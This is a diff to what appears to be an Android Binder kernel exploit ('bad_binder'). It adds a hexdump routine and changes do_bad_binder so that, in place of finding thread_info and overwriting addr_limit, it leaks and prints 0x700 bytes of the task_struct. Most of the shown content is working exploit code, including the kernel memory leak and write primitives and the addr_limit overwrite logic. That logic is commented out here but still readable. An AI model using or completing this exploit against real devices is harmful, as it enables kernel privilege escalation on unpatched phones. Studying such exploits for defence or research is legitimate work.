@@ -11,6 +11,32 @@
 
 #include "bad_binder.h"
 
+void hexdump_memory(unsigned char *buf, size_t byte_count) {
+  unsigned long byte_offset_start = 0;
+  if (byte_count % 16)
+    errx(1, "hexdump_memory called with non-full line");
+  for (unsigned long byte_offset = byte_offset_start; byte_offset < byte_offset_start + byte_count;
+          byte_offset += 16) {
+    char line[1000];
+    char *linep = line;
+    linep += sprintf(linep, "%08lx  ", byte_offset);
+    for (int i=0; i<16; i++) {
+      linep += sprintf(linep, "%02hhx ", (unsigned char)buf[byte_offset + i]);
+    }
+    linep += sprintf(linep, " |");
+    for (int i=0; i<16; i++) {
+      char c = buf[byte_offset + i];
+      if (isalnum(c) || ispunct(c) || c == ' ') {
+        *(linep++) = c;
+      } else {
+        *(linep++) = '.';
+      }
+    }
+    linep += sprintf(linep, "|");
+    puts(line);
+  }
+}
+
 
 static int32_t try_write_kernel_memory(int32_t iBinderFd, int32_t iEpFd, void* pDummyBuff, uint64_t pWriteAddr, uint64_t uiWriteSz, void* pSourceBuff)
 {
@@ -506,27 +532,34 @@ int32_t do_bad_binder(uint64_t* ppTaskStruct, uint64_t* ppThreadInfo)
 
     printf("[+] leaked task_struct ptr: %lx\n", pTaskStruct);
 
-    if(0 != find_thread_info(iBinderFd, iEpFd, pDummyBuff, pTaskStruct, &pThreadInfo))
-    {
-        printf("[-] failed to find address of thread_info struct!\n");
-        goto done;
-    }
+    // if(0 != find_thread_info(iBinderFd, iEpFd, pDummyBuff, pTaskStruct, &pThreadInfo))
+    // {
+    //     printf("[-] failed to find address of thread_info struct!\n");
+    //     goto done;
+    // }
 
-    printf("[+] found thread_info ptr: %lx\n", pThreadInfo);
-    printf("[!] attempting to overwrite addr_limit...\n");
+    //printf("[+] found thread_info ptr: %lx\n", pThreadInfo);
 
-    pAddrLimit = pThreadInfo + ADDR_LIMIT_THREAD_INFO_OFFSET;
+    char task_struct_data[0x700] = {0};
+    char thread_info_data[0x100] = {0};
 
-    if(0 != write_kernel_memory(iBinderFd, iEpFd, pDummyBuff, pAddrLimit, sizeof(uint64_t), &ulNewAddrLimit))
-    {
-        printf("[-] failed to overwrite current thread's address limit!\n");
-        goto done;
-    }
+    leak_kernel_memory(iBinderFd, iEpFd, pDummyBuff, pTaskStruct, 0x700, task_struct_data, &pTaskStruct);
+    printf("task_struct_data\n");
+    hexdump_memory(task_struct_data, 0x700);
+    // printf("[!] attempting to overwrite addr_limit...\n");
 
-    *ppTaskStruct = pTaskStruct;
-    *ppThreadInfo = pThreadInfo;
+    //pAddrLimit = pThreadInfo + ADDR_LIMIT_THREAD_INFO_OFFSET;
 
-    iRet = 0;
+    // if(0 != write_kernel_memory(iBinderFd, iEpFd, pDummyBuff, pAddrLimit, sizeof(uint64_t), &ulNewAddrLimit))
+    // {
+    //     printf("[-] failed to overwrite current thread's address limit!\n");
+    //     goto done;
+    // }
+
+    // *ppTaskStruct = pTaskStruct;
+    // *ppThreadInfo = pThreadInfo;
+
+    // iRet = 0;
 
 done:
 
